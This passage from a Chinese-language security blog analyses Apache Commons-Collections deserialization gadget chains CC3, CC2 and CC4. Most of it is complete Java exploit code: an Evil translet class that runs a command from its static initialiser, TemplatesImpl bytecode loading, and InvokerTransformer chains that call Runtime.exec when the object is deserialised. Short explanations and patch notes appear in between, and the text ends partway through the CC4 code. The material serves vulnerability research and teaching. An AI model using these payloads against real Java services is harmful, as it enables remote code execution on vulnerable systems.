class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Evil.class</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>demo</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(argMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>    evilMap.put(<span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;yyy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>把CC6改造一下，就得到了CC3：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>        &#125;;<br>        <br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728215703672.png" alt="image-20240728215703672"></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>前面就提到，Commons-Collection有俩官方的包：</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>两者的命名空间不冲突，也就是可以共存在同⼀个项目中。</p><p>使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之前我们研究的利用链<code>CC1、CC6、CC3</code>在<code>commons-collections4</code>均能正常使用，不过方法名可能稍有变动，其实就是<code>Lazymap</code>处decorate没了：</p><p>原decorate:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个⽅法不过就是<code>LazyMap</code>构造函数的⼀个包装，⽽在4中其实只是改了个名字叫<code>lazymap</code>。</p><p>4中的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;K, V&gt; map, <span class="hljs-keyword">final</span> </span><br><span class="hljs-params">Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>&lt;K,V&gt;(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将Gadget中出错的代码换⼀下名字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>然后弹calc是一样的。</p><p>由此可得，CC链实际上就是一条<code>Serializable#readObject()</code>到<code>Transformer#transform()</code>的调用链。</p><p>要看CC2，那么这里就需要引入两个新类：</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>&#123;<br>            s.defaultReadObject();<br>            s.readInt();<br>            queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>                queue[i] = s.readObject();<br>            heapify();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TransformingComparator#compare</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>Gadget chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject() =&gt; <br>heapify() =&gt; <br>siftDown() =&gt; <br>siftDownUsingComparator() =&gt; <br>comparator.compare() =&gt; <br>transformer.transform()<br></code></pre></td></tr></table></figure><ul><li><code>heapify</code> <code>int i = (size &gt;&gt;&gt; 1) - 1</code>需要非负</li><li><code>siftDownUsingComparator</code> <code>half = size &gt;&gt;&gt; 1</code>需要大于上面的i</li></ul><p>而且<code>PriorityQueue</code>构造函数不会给size赋初值，需要用反射去赋值。</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">pq</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        setFieldValue(pq, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(pq);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728222834295.png" alt="image-20240728222834295"></p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code>在<code>commons-collections4.0</code>以前是版本没有实现<code>Serializable</code>接口</p><p>官方发布的新版本4.1和3.2.2用于修复CC链3.2.2中增加了⼀个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FunctorUtils#checkUnsafeSerialization`<br></code></pre></td></tr></table></figure><p>它用于检测反序列化是否安全，其会检查常⻅的危险Transformer类，当我们反序列化包含这些对象时就会抛出异常。 若开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> 即默认情况下会抛出异常</p><p>4.1中这几个危险的<code>Transformer</code>类不再实现<code>Serializable</code>接口，直接不能序列化和反序列化。</p><p><strong>因此CC2只能在<code>commons-collections4.0</code>上跑通。</strong></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4跟CC2很接近。都是在Commons-Collections4的基础上的CC链。</p><p>而本质其实CC4就是用<code>InstantiateTransformer</code>代替了CC2的<code>InvokerTransformer</code>，借用一下<code>ysoserial</code>的代码,其实就是<code>CommonsCollections2</code>的<code>TemplatesImpl</code>变体，把CC2和CC3拼接一下，就得到了CC4：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 